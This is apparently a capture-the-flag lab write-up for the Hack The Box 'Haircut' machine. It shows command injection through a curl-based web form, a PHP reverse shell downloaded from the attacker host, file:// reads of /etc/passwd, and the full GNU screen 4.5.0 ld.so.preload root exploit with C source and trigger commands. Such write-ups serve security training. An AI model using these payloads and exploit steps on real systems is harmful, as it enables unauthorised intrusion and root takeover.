---
description: 10.10.10.24
---

# Haircut

![](<../../.gitbook/assets/1 (5).JPG>)

## Overview

The following exploits are covered for obtaining the flags on this target: ​

* User - Webapp executing curl command can be used to upload a webshell or reverse shell payload which can be executed either via command substitution or the browser depending on where the uploaded file is stored.
* Root - SUID binary screen-4.5.0 with known vulnerability: EDB-ID: 41154

## Enumeration:

### Nmap

Let's begin with a basic nmap scan for all TCP ports:

```
└─$ nmap -p- 10.10.10.24
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 12:40 EST
Nmap scan report for 10.10.10.24
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds

```

Now that we have a list of open ports, let's run a more targeted nmap scan:

```
└─$ sudo nmap -sS -sV --version-all -A -p 22,80 10.10.10.24 -n
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 12:42 EST
Nmap scan report for 10.10.10.24
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   18.68 ms 10.10.14.1
2   18.81 ms 10.10.10.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.65 seconds

```

### Whatweb

Let's run whatweb against the target to see which technologies are being used for the webapp.

```
└─$ whatweb http://10.10.10.24/ 
http://10.10.10.24/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.24], Title[HTB Hairdresser], nginx[1.10.0]

```

### Nikto

Let's run a Nikto scan against the target.

```
└─$ nikto -host http://10.10.10.24/ -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.24
+ Target Hostname:    10.10.10.24
+ Target Port:        80
+ Start Time:         2021-11-16 12:47:22 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.10.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ nginx/1.10.0 appears to be outdated (current is at least 1.14.0)
+ OSVDB-3092: /test.html: This might be interesting...

```

### Gobuster

Let's run a gobuster scan against the target.

```
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.24 -q -k -x php
/uploads (Status: 301)
/exposed.php (Status: 200)

```

## Website exploration

#### ​Review the source code for each page

Let's have a look at the page source and make a note of anything interesting:

* The main page is very basic, nothing but an image

#### Review the source code for any scripts that are being used on each page

Let's have a look at the scripts using the browser dev tools and make a note of anything interesting:

* No scripts on the main page
* Gobuster did find exposed.php, which we'll need to investigate further​

Let's visit the exposed.php page. Clicking on the "Go" button returns some information pertaining to the example site listed.

![](<../../.gitbook/assets/2 (2) (1).JPG>)

If we clear the form field and hit the "Go" button, we get an error confirming that this page is using the "curl" program.

![](<../../.gitbook/assets/4 (3) (1) (1).JPG>)

If we enter a bogus page, like bogus.html, we get a 404 error.&#x20;

We can also try special characters, but there is a filter which is not alloing them:

> http://localhost/test.html ;
>
> http://localhost/test.html &&
>
> http://localhost/test.html ||

![](<../../.gitbook/assets/3 (4).JPG>)

Let's see if we can read local files:

> file:///etc/passwd

![](<../../.gitbook/assets/5 (3) (1) (1).JPG>)

We get back the contents of the /etc/passwd file. Let's see if we can view the contents of the exposed.php file:

> file:///var/www/html/exposed.php

![](<../../.gitbook/assets/7 (3) (1).JPG>)

If we right click and view page source for the page above, which displays the code in a more human readble format:

![](<../../.gitbook/assets/8 (2) (1) (1).JPG>)

There are a number of disallowed characters and commands which we will need to try and bypass.

## Gaining Access Method 1- Curl & PHP

Let's try to use command substitution:

> http://localhost/test.html $(id)

![](<../../.gitbook/assets/6 (4).JPG>)

We get back the output mixed in with other output from the curl command. This is great, because we can potentially execute some code if we can upload something to the target. For this, I'll use PHP because it is not one of the disallowed commands. For more information about PHP on the command line, check out the following page:

{% embed url="https://www.php.net/manual/en/features.commandline.php" %}

Copy a PHP reverse shell script (eg on Kali /usr/share/webshells/php/php-reverse-shell.php) and modify the IP and port number. Start a python3 web server in the same directory to host the file. Next, we need to try and save it to disk on the target.&#x20;

We try with the following payloads, but we get permission denied errors:

> http://10.10.14.7/rshell.php -O
>
> http://10.10.14.7/rshell.php -o /var/www/rshell.php&#x20;
>
> http://10.10.14.7/rshell.php -o /var/www/html/rshell.php

For more information on the curl output options, checkout the following page:

{% embed url="https://everything.curl.dev/usingcurl/downloads" %}

Let's try saving the file to /dev/shm instead:

> http://10.10.14.7/rshell.php -o /dev/shm/rshell.php

![](<../../.gitbook/assets/9 (1) (1).JPG>)

We don't get any errors back, which is good. Let's see if we can list the files to confirm:

> http://localhost/test.html $(ls /dev/shm)

![](<../../.gitbook/assets/10 (3).JPG>)

It worked. Let's start a netcat listener, and then use the command substitution to execute the PHP script as follows:

> http://localhost/test.html $(php -f /dev/shm/rshell.php)

In the listener window, we get a shell as the "www-data" user. We can upgrade the shell, and then grab the user flag.

```
└─$ nc -nvlp 8888
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:59902.
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:25:55 up  2:10,  0 users,  load average: 0.03, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@haircut:/$ pwd
pwd
/
www-data@haircut:/$ cd home
cd home
www-data@haircut:/home$ ls
ls
maria
www-data@haircut:/home$ cd maria
cd maria
www-data@haircut:/home/maria$ ls
ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
www-data@haircut:/home/maria$ cat user.txt
cat user.txt
cc1b1119ff42eebb3fc30036c871d35f
www-data@haircut:/home/maria$ 

```

## Gaining Access Method 2- Curl & browser

Once we confirm that we can use curl to grab files off our attacker box, we need a place to write them. The gobuster scan we did revealed that there is a /uploads directory, but when we visit the page [http://10.10.10.24/uploads/](http://10.10.10.24/uploads/) we get a "403 Forbidden" error. However, it's reasonable to assume that this would be an accessible location for storing uploaded files.

We need to make a small leap here, because, if we look at the page source for the home page, we see a link to the image that is being loaded on the page at [http://10.10.10.24/bounce.jpg](http://10.10.10.24/bounce.jpg). Let's see if this file is also stored in the /uploads directory, by opening the page at [http://10.10.10.24/uploads/bounce.jpg](http://10.10.10.24/uploads/bounce.jpg). This works, and is most likely just a clue from the box creators that we may be able to upload something here. This means that we wouldnt need to first write a file somewhere else and then execute it as we could simply just save it in the /uploads directory and then visit the page in our browser.

Let's try that. First, let's see if we can save the reverse shell PHP script:

> http://10.10.14.7/rshell.php -o /var/www/html/uploads/rshell.php

It works, we don't see any errors. All we need to do next is visit the page in our browser after starting a listener:

> [http://10.10.10.24/uploads/rshell.php](http://10.10.10.24/uploads/rshell.php)

```
└─$ nc -nvlp 8888                         
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:59906.
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:46:20 up  2:30,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Enumeration as "www-data"

Let's gather some basic system information:

```
www-data@haircut:/$ uname -a;cat /etc/*-release;netstat -antp
uname -a;cat /etc/*-release;netstat -antp
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.2 LTS"
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1227/nginx: worker 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0    848 10.10.10.24:59902       10.10.14.7:8888         ESTABLISHED 4506/php        
tcp        0      0 10.10.10.24:80          10.10.14.7:49394        TIME_WAIT   -               
tcp        0      0 10.10.10.24:59906       10.10.14.7:8888         TIME_WAIT   -               
tcp6       0      0 :::80                   :::*                    LISTEN      1227/nginx: worker 
tcp6       0      0 :::22                   :::*                    LISTEN      -               
www-data@haircut:/$ 
```

Let's check for SUID binaries:

```
www-data@haircut:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
www-data@haircut:/$ 
```

The one that stands out here is the "/usr/bin/screen-4.5.0" binary. Looking on GTFObins, we see there is an entry for "screen", however, there is no "SUID" exploit mentioned.&#x20;

{% embed url="https://gtfobins.github.io/gtfobins/screen" %}

Let's check the exploit database to see if there are any known vulnerabilities for it:

```
└─$ searchsploit 'screen 4.5.0'
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                   | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                             | linux/local/41152.txt
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

There are two entries, let's copy them to our working directory an review them.

```
└─$ searchsploit -m linux/local/41152.txt
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation (PoC)
      URL: https://www.exploit-db.com/exploits/41152
     Path: /usr/share/exploitdb/exploits/linux/local/41152.txt
File Type: ASCII text

Copied to: /mnt/hgfs/share/hackthebox/Retired_machines/Haircut_10.10.10.24/41152.txt

└─$ searchsploit -m linux/local/41154.sh 
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
File Type: Bourne-Again shell script, ASCII text executable

Copied to: /mnt/hgfs/share/hackthebox/Retired_machines/Haircut_10.10.10.24/41154.sh

```

The exploit can also be found at the following page:

{% embed url="https://www.exploit-db.com/exploits/41154" %}

For more technical information regarding this vulnerability, check out the following page:

{% embed url="https://cxsecurity.com/issue/WLB-2017010196" %}

## Privilege Escalation

The target system is a x86\_64 architecture, which we confirmed with our system checks. For that reason, we're going to compile the two files in the exploit script on our attacker system, which is also a_ x_86\_64 box.

First, let's create the two C files as follows:

```
└─$ cat libhax.c                              
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}

└─$ cat rootshell.c  
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}

```

Next, let's compile them as per the exploit script:

```
└─$ gcc -fPIC -shared -ldl -o libhax.so libhax.c                                                              1 ⨯
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
                                         
└─$ gcc -o rootshell rootshell.c  
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]

```

There are no errors, but we do get a number of warnings, which we can safely ignore in this scenario.

Next, transfer the compiled files to the target system in /tmp:

```
www-data@haircut:/$ cd /tmp
cd /tmp
www-data@haircut:/tmp$ ls
ls
systemd-private-7555ad73ab604aacbffed6ab62a73a29-systemd-timesyncd.service-0wjak6
vmware-root
www-data@haircut:/tmp$ wget 10.10.14.7/libhax.so
wget 10.10.14.7/libhax.so
--2021-11-17 13:46:29--  http://10.10.14.7/libhax.so
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15552 (15K) [application/octet-stream]
Saving to: 'libhax.so'

libhax.so           100%[===================>]  15.19K  --.-KB/s    in 0.02s   

2021-11-17 13:46:29 (966 KB/s) - 'libhax.so' saved [15552/15552]

www-data@haircut:/tmp$ wget 10.10.14.7/rootshell
wget 10.10.14.7/rootshell
--2021-11-17 13:46:44--  http://10.10.14.7/rootshell
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16256 (16K) [application/octet-stream]
Saving to: 'rootshell'

rootshell           100%[===================>]  15.88K  --.-KB/s    in 0.02s   

2021-11-17 13:46:44 (830 KB/s) - 'rootshell' saved [16256/16256]

www-data@haircut:/tmp$ ls
ls
libhax.so
rootshell
systemd-private-7555ad73ab604aacbffed6ab62a73a29-systemd-timesyncd.service-0wjak6
vmware-root
www-data@haircut:/tmp$ 
```

Next, we need to run the following commands:

> cd /etc         --> the location of the shared library file we will create, which contains a reference to our own library file /tmp/libhax.so
>
> umask 000  --> see [https://en.wikipedia.org/wiki/Umask](https://en.wikipedia.org/wiki/Umask)
>
> screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"  --> create /etc/ld.so.preload and write /tmp/libhax.so to it
>
> screen -ls   --> trigger the vulnerability

```
www-data@haircut:/tmp$ cd /etc
cd /etc
www-data@haircut:/etc$ umask 000
umask 000
www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" 
<en -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"                    
www-data@haircut:/etc$ screen -ls
screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$
```

If we look at the /tmp/rootshell binary, it now has the SUID bit set and is owned by root and executable by everyone. To get a root shell, all we need to do is run it, and then we can grab the root flag.

```
www-data@haircut:/etc$ ls -la /tmp/rootshell
ls -la /tmp/rootshell
-rwsr-xr-x 1 root root 16256 Nov 17 13:01 /tmp/rootshell
www-data@haircut:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
cat /root/root.txt
5cc6fed70f066782fd8485fd96545f88
# 
```

## Resources

The bug was first reported here:

{% embed url="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html" %}

Below is the patch implemented to fix the vulnerable code:

{% embed url="http://git.savannah.gnu.org/cgit/screen.git/commit?id=c575c40c9bd7653470639da32e06faed0a9b2ec4" %}





